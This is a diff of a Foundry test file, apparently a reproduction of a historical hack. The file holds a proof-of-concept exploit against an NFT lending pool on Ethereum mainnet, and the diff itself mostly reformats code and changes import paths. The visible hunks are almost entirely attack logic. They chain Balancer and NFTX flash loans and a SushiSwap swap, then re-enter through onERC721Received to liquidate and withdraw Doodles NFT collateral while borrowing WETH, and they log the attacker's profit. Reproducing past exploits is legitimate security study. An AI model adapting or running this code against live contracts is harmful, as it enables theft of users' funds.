@@ -3,8 +3,8 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
-import {IERC721} from "OpenZeppelin/interfaces/IERC721.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
+import {IERC721} from "src/interfaces/IERC721.sol";
 
 import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
 import {IWETH} from "src/interfaces/IWETH.sol";
@@ -12,35 +12,37 @@ import {ISushiSwap} from "src/interfaces/ISushiSwap.sol";
 // Credit: SupremacyCA, the poc rewritten from SupremacyCA.
 
 interface DataTypes {
-
     struct ERC721SupplyParams {
         uint256 tokenId;
         bool useAsCollateral;
     }
-
 }
 
 interface ILib {
-
     function attack() external returns (bool);
 
     function withdrawAll() external returns (bool);
-
 }
 
 interface IDOODLENFTXVault {
-
-    function flashLoan(address receiver, address token, uint256 amount, bytes memory data) external returns (bool);
-    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] calldata);
+    function flashLoan(
+        address receiver,
+        address token,
+        uint256 amount,
+        bytes memory data
+    ) external returns (bool);
+    function redeem(
+        uint256 amount,
+        uint256[] calldata specificIds
+    ) external returns (uint256[] calldata);
     function balanceOf(address account) external view returns (uint256);
-    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts /* ignored for ERC721 vaults */ )
-        external
-        returns (uint256);
-
+    function mint(
+        uint256[] calldata tokenIds,
+        uint256[] calldata amounts /* ignored for ERC721 vaults */
+    ) external returns (uint256);
 }
 
 interface IOmni {
-
     function supplyERC721(
         address asset,
         DataTypes.ERC721SupplyParams[] memory tokenData,
@@ -48,7 +50,11 @@ interface IOmni {
         uint16 referralCode
     ) external;
 
-    function withdrawERC721(address asset, uint256[] memory tokenIds, address to) external returns (uint256);
+    function withdrawERC721(
+        address asset,
+        uint256[] memory tokenIds,
+        address to
+    ) external returns (uint256);
     function liquidationERC721(
         address collateralAsset,
         address liquidationAsset,
@@ -63,10 +69,17 @@ interface IOmni {
         bool useAsCollateral;
     }
 
-    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
-        external;
+    function borrow(
+        address asset,
+        uint256 amount,
+        uint256 interestRateMode,
+        uint16 referralCode,
+        address onBehalfOf
+    ) external;
 
-    function getUserAccountData(address user)
+    function getUserAccountData(
+        address user
+    )
         external
         view
         returns (
@@ -78,23 +91,25 @@ interface IOmni {
             uint256 healthFactor,
             uint256 erc721HealthFactor
         );
-
 }
 
 contract ContractTest is Test {
-
     IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IDOODLENFTXVault doodleVault =
+        IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
+    IBalancerVault balancer =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
     ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
     IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
-    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
+    address private constant NToken =
+        0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
     uint256 private nonce;
     address private immutable owner;
     address private _lib;
-    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant RETURN_VALUE =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Not your biz!");
@@ -108,7 +123,10 @@ contract ContractTest is Test {
 
     function testExploit() public {
         payable(address(0)).transfer(address(this).balance);
-        emit log_named_uint("Before exploiting, ETH balance of attacker:", address(this).balance);
+        emit log_named_uint(
+            "Before exploiting, ETH balance of attacker:",
+            address(this).balance
+        );
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
 
@@ -118,15 +136,32 @@ contract ContractTest is Test {
         balancer.flashLoan(address(this), tokens, amounts, "");
     }
 
-    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
-        require(msg.sender == address(balancer), "You are not a market maker for Flash Loan!");
+    function receiveFlashLoan(
+        address[] memory,
+        uint256[] memory,
+        uint256[] memory,
+        bytes memory
+    ) external {
+        require(
+            msg.sender == address(balancer),
+            "You are not a market maker for Flash Loan!"
+        );
         doodle.approve(address(doodle), type(uint256).max);
         doodles.setApprovalForAll(address(doodle), true);
         doodleVault.flashLoan(address(this), address(doodle), 20 ether, "");
     }
 
-    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
-        require(msg.sender == address(doodle), "You are not a market maker for Flash Loan!");
+    function onFlashLoan(
+        address,
+        address,
+        uint256,
+        uint256,
+        bytes memory
+    ) external returns (bytes32) {
+        require(
+            msg.sender == address(doodle),
+            "You are not a market maker for Flash Loan!"
+        );
 
         WETH.approve(address(router), type(uint256).max);
 
@@ -134,7 +169,13 @@ contract ContractTest is Test {
         _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
         _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE
 
-        router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);
+        router.swapTokensForExactTokens(
+            12e17,
+            200 ether,
+            _path,
+            address(this),
+            block.timestamp
+        );
 
         uint256[] memory _specificIds = new uint256[](20);
         _specificIds[0] = 4777;
@@ -184,20 +225,38 @@ contract ContractTest is Test {
 
         require(ILib(_lib).withdrawAll(), "Withdraw Error.");
 
-        require(doodleVault.mint(_specificIds, _amount) == 20, "Error Amounts.");
+        require(
+            doodleVault.mint(_specificIds, _amount) == 20,
+            "Error Amounts."
+        );
 
         uint256 profit = getters();
-        emit log_named_uint("After exploiting, ETH balance of attacker:", address(this).balance);
+        emit log_named_uint(
+            "After exploiting, ETH balance of attacker:",
+            address(this).balance
+        );
 
         return RETURN_VALUE;
     }
 
-    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) {
         if (msg.sender == NToken) {
             if (nonce == 21) {
                 nonce++;
                 WETH.approve(address(pool), type(uint256).max);
-                pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);
+                pool.liquidationERC721(
+                    address(doodles),
+                    address(WETH),
+                    address(_lib),
+                    7425,
+                    100 ether,
+                    false
+                );
                 return this.onERC721Received.selector;
             } else if (nonce == 22) {
                 uint256[] memory _specificIds = new uint256[](3);
@@ -207,7 +266,11 @@ contract ContractTest is Test {
 
                 uint256 length = _specificIds.length;
                 for (uint256 i = 0; i < length; i++) {
-                    doodles.safeTransferFrom(address(this), address(_lib), _specificIds[i]);
+                    doodles.safeTransferFrom(
+                        address(this),
+                        address(_lib),
+                        _specificIds[i]
+                    );
                 }
 
                 nonce = 1337;
@@ -279,17 +342,16 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
 
 contract Lib {
-
     address private immutable exp;
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
     IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
     IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
-    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
+    address private constant NToken =
+        0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
 
     modifier onlyExp() {
         require(msg.sender == exp, "Not your biz!");
@@ -306,7 +368,8 @@ contract Lib {
     }
 
     function joker() external onlyExp {
-        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](3);
+        DataTypes.ERC721SupplyParams[]
+            memory _params = new DataTypes.ERC721SupplyParams[](3);
 
         _params[0].tokenId = 720;
         _params[0].useAsCollateral = true;
@@ -319,7 +382,7 @@ contract Lib {
 
         pool.supplyERC721(address(doodles), _params, address(this), 0);
 
-        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
+        (, , uint256 amount, , , , ) = pool.getUserAccountData(address(this));
 
         pool.borrow(address(WETH), amount, 2, 0, address(this));
 
@@ -328,13 +391,17 @@ contract Lib {
         tokenIds[0] = 720;
         tokenIds[1] = 5251;
 
-        require(pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2, "Withdraw Error.");
+        require(
+            pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2,
+            "Withdraw Error."
+        );
     }
 
     function attack() external onlyExp returns (bool) {
         doodles.setApprovalForAll(address(pool), true);
 
-        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](20);
+        DataTypes.ERC721SupplyParams[]
+            memory _params = new DataTypes.ERC721SupplyParams[](20);
 
         _params[0].tokenId = 4777;
         _params[0].useAsCollateral = true;
@@ -398,7 +465,7 @@ contract Lib {
 
         pool.supplyERC721(address(doodles), _params, address(this), 0);
 
-        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
+        (, , uint256 amount, , , , ) = pool.getUserAccountData(address(this));
 
         pool.borrow(address(WETH), amount, 2, 0, address(this));
 
@@ -437,8 +504,12 @@ contract Lib {
         return true;
     }
 
-    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
-
 }
